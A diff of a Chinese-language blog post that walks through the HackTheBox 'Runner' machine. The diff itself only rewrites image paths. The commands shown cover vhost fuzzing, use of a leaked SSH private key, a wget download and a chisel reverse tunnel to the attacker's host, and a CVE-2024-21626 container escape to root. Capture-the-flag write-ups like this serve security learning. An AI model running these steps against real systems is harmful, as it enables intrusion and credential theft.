@@ -151,50 +151,50 @@ ffuf">
 
 <h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http://runner.htb &gt; wordlist.txt</span><br><span class="line">ffuf -w wordlist.txt -u http://runner.htb -H &quot;HOST: FUZZ.runner.htb&quot; -mc all -fc 302</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/202408131744323.png" alt="202408131744323img"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/202408131744323.png" alt="202408131744323img"></p>
 <p>添加hosts</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.13 teamcity.runner.htb&quot; | sudo tee -a /etc/host</span><br></pre></td></tr></table></figure>
 
 <p>runner.htb</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723543582097.png" alt="截屏2024-08-13 17.53.37"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723543582097.png" alt="截屏2024-08-13 17.53.37"></p>
 <p>teamcity.runner.htb</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723543577689.png" alt="截屏2024-08-13 17.53.49"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723543577689.png" alt="截屏2024-08-13 17.53.49"></p>
 <p>Google search</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723618225407.png" alt="image-20240814145019797"></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723618601553.png" alt="image-20240814145641499"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723618225407.png" alt="image-20240814145019797"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723618601553.png" alt="image-20240814145641499"></p>
 <h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>测试功能，Backup能备份文件且能下载</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723711668613.png" alt="截屏2024-08-15 16.23.20"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723711668613.png" alt="截屏2024-08-15 16.23.20"></p>
 <p>config&#x2F;projects&#x2F;AllProjects&#x2F;pluginData&#x2F;ssh_keys&#x2F;id_rsa</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723712031741.png" alt="image-20240815165351687"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723712031741.png" alt="image-20240815165351687"></p>
 <p>database_dump&#x2F;users</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723712715059.png" alt="image-20240815170515031"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723712715059.png" alt="image-20240815170515031"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john@runner.htb</span><br><span class="line">matthew@runner.htb</span><br></pre></td></tr></table></figure>
 
 <p>ssh</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa john@runner.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723713424348.png" alt="image-20240815171704301"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723713424348.png" alt="image-20240815171704301"></p>
 <p>端口开放情况，portainer:9000 , teamcity:8111 -&gt;80</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723779368955.png" alt="截屏2024-08-16 11.35.44"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723779368955.png" alt="截屏2024-08-16 11.35.44"></p>
 <h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">传文件</span></span><br><span class="line">python3 -m http.server 80</span><br><span class="line">wget http://10.10.16.41/chisel</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali</span></span><br><span class="line">./chisel server -p 3000 --reverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">靶机</span></span><br><span class="line">./chisel client 10.10.16.41:3000 R:9000:127.0.0.1:9000</span><br></pre></td></tr></table></figure>
 
 <p>需要登陆，下载的users文件中还有用户，尝试破解</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723780405605.png" alt="截屏2024-08-16 11.53.10"></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723780354220.png" alt="截屏2024-08-16 11.52.06"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723780405605.png" alt="截屏2024-08-16 11.53.10"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723780354220.png" alt="截屏2024-08-16 11.52.06"></p>
 <p>登陆portainer后，根据两篇文章解</p>
 <p><a target="_blank" rel="noopener" href="https://nitroc.org/en/posts/cve-2024-21626-illustrated/?source=post_page-----64ed8bf080f4--------------------------------#exploit-via-setting-working-directory-to-procselffdfd">CVE-2024-21626</a></p>
 <p><a target="_blank" rel="noopener" href="https://medium.com/@chaudharijugal07/runner-walkthrough-hackthebox-64ed8bf080f4">https://medium.com/@chaudharijugal07/runner-walkthrough-hackthebox-64ed8bf080f4</a></p>
 <p>Docker, Image 里有两个镜像</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723778986085.png" alt="截屏2024-08-16 11.29.30"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778986085.png" alt="截屏2024-08-16 11.29.30"></p>
 <p>创建一个容器</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723778891497.png" alt="截屏2024-08-16 11.13.00"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778891497.png" alt="截屏2024-08-16 11.13.00"></p>
 <p>工作目录设置 <code>/proc/self/fd/8</code></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723778872939.png" alt="截屏2024-08-16 11.19.31"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778872939.png" alt="截屏2024-08-16 11.19.31"></p>
 <p>进入0721容器</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723778828122.png" alt="截屏2024-08-16 11.22.05"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778828122.png" alt="截屏2024-08-16 11.22.05"></p>
 <p>连接root</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723778838123.png" alt="截屏2024-08-16 11.21.50"></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1723778802740.png" alt="截屏2024-08-16 11.26.07"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778838123.png" alt="截屏2024-08-16 11.21.50"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778802740.png" alt="截屏2024-08-16 11.26.07"></p>
 
 	  <!--
 <div class="article-footer-copyright">
